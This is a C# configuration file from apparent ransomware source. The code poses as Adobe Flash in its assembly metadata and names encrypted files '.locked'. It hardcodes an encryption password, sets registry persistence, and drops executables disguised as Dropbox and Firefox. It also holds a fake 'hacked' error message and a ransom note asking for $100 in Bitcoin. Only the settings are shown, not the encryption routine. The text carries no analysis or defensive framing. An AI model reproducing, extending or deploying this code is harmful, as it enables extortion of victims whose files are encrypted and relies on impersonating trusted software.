using System;
using System.IO;
using Main.Tools;

namespace Main;

internal static class Config
{
	internal enum StartModeType
	{
		Debug,
		ErrorMessage,
		NothingHappens,
		DeleteItself
	}

	internal const string AssemblyProdutAndTitle = "adobe";

	internal const string AssemblyCopyright = "Copyright 1999-2012 adobe and flash developers. All rights reserved.";

	internal const string AssemblyVersion = "37.0.2.5583";

	internal const string EncryptionFileExtension = ".locked";

	internal const int MaxFilesizeToEncryptInBytes = 10000000;

	internal const string EncryptionPassword = "OoIsAwwF32cICQoLDA0ODe==";

	internal static StartModeType StartMode;

	internal static string ErrorMessage;

	internal static string ErrorTitle;

	internal static Windows.StartupMethodType StartupMethod;

	internal static string TempExeRelativePath;

	internal static string TempExePath;

	internal static string FinalExeRelativePath;

	internal static string FinalExePath;

	internal static string WorkFolderRelativePath;

	internal static string WorkFolderPath;

	internal static bool OnlyRunAfterSysRestart;

	internal static DateTime ActiveAfterDateTime;

	internal static bool Activated;

	internal static int TimerActivateCheckerInterval;

	internal static string WelcomeMessage;

	internal static string TaskMessage;

	internal static int RansomUsd;

	static Config()
	{
		Activated = false;
		TimerActivateCheckerInterval = 6000;
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
		string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
		StartMode = StartModeType.ErrorMessage;
		ActiveAfterDateTime = new DateTime(2016, 1, 1);
		ErrorMessage = "You just got hacked by ASC TEAM" + Environment.NewLine + ".NET ";
		ErrorTitle = "Upsss";
		StartupMethod = Windows.StartupMethodType.Registry;
		TempExeRelativePath = "Drpbx\\drpbx.exe";
		FinalExeRelativePath = "Frfx\\firefox.exe";
		FinalExePath = Path.Combine(folderPath, FinalExeRelativePath);
		TempExePath = Path.Combine(folderPath2, TempExeRelativePath);
		WorkFolderRelativePath = "System32Work\\";
		WorkFolderPath = Path.Combine(folderPath, WorkFolderRelativePath);
		if (!Directory.Exists(WorkFolderPath))
		{
			Directory.CreateDirectory(WorkFolderPath);
		}
		OnlyRunAfterSysRestart = false;
		WelcomeMessage = "Ooops, your files have been encrypted !";
		RansomUsd = 100;
		TaskMessage = "Please, send at least $" + RansomUsd + " worth of Bitcoin here:";
	}
}
